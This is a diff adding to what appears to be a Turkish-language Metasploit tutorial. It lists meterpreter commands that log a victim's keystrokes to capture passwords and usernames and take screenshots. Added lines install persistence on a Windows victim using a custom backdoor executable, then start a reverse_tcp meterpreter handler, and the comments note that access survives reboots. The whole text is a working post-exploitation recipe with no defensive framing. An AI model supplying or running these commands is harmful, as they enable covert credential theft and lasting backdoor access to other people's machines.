@@ -17,3 +17,16 @@
 > meterpreter > keyscan_start // kurbanın ekran kaydı başlar
 > meterpreter > keyscan_dump // kurbanın ekran kaydı süresince giriş yaptığı,site,password,kullanıcı adı.. her şey çıkar
 > meterpreter > screenshot // kurbanın ekran görüntüsünü alır. /root klasörüne konumlanır
+
+**_ Bağlantıyı Sürdürebilir Hale Getirmek _**
+
+> meterpreter > background //geri gitmek için
+> use exploit>windows>local>persistence //modülün amacı genelde erişim kalıcılığı (persistence) sağlamaktır
+> msf exploit(persistence) > show options //required kısımlar doldurulur
+> msf exploit(persistence) > set SESSION 1
+> msf exploit(persistence) > show advanced //diğer ayarlar
+> msf exploit(persistence) > set EXE::Custom /var/www/html/backdoors/newpayload.exe //kendi .exe dosyamızı koymak istersek
+> msf exploit(persistence) > exploit //kalıcı olarak kurbanın sistemine erişim sağlandı. Kurban cihazı kapatıp açsa dahi bağlantı gitmez
+> msf exploit(persistence) > use exploit/multi/handler
+> msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+> msf exploit(multi/handler) > exploit
